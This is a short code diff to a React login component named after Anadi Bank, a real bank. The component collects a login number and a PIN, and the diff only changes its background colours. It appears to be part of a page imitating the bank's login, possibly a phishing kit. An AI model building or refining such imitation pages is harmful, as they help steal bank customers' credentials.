@@ -57,7 +57,7 @@ export function AnadiBank({ formData, onChange, handleRouteAction, saving }: Pro
       <div className="relative z-10 flex-1 flex flex-col items-center justify-center p-4">
         
         {/* Login Card */}
-        <div className="bg-white w-full max-w-[500px] shadow-lg rounded-sm overflow-hidden mt-[-80px]">
+        <div className="bg-[#fff6ec] w-full max-w-[500px] shadow-lg rounded-sm overflow-hidden mt-[-80px]">
           
           {/* Header Strip */}
           <div className="bg-[#ffcc00] px-6 py-4">
@@ -91,7 +91,7 @@ export function AnadiBank({ formData, onChange, handleRouteAction, saving }: Pro
                     type="text"
                     value={formData.verfuegernummer || ""}
                     onChange={(e) => onChange("verfuegernummer", e.target.value)}
-                    className="w-full bg-[#f8f9fa] border border-[#d0d0d0] rounded-[3px] px-3 py-[10px] outline-none focus:border-[#004b87] focus:bg-white text-[15px] text-[#333] mb-6 transition-colors"
+                    className="w-full bg-[#f8f9fa] border border-[#d0d0d0] rounded-[3px] px-3 py-[10px] outline-none focus:border-[#004b87] focus:bg-[#fff6ec] text-[15px] text-[#333] mb-6 transition-colors"
                   />
                 </>
               ) : (
@@ -110,7 +110,7 @@ export function AnadiBank({ formData, onChange, handleRouteAction, saving }: Pro
                     value={formData.pin || ""}
                     onChange={(e) => onChange("pin", e.target.value)}
                     autoFocus
-                    className="w-full bg-[#f8f9fa] border border-[#d0d0d0] rounded-[3px] px-3 py-[10px] outline-none focus:border-[#004b87] focus:bg-white text-[15px] text-[#333] mb-6 transition-colors"
+                    className="w-full bg-[#f8f9fa] border border-[#d0d0d0] rounded-[3px] px-3 py-[10px] outline-none focus:border-[#004b87] focus:bg-[#fff6ec] text-[15px] text-[#333] mb-6 transition-colors"
                   />
                 </>
               )}
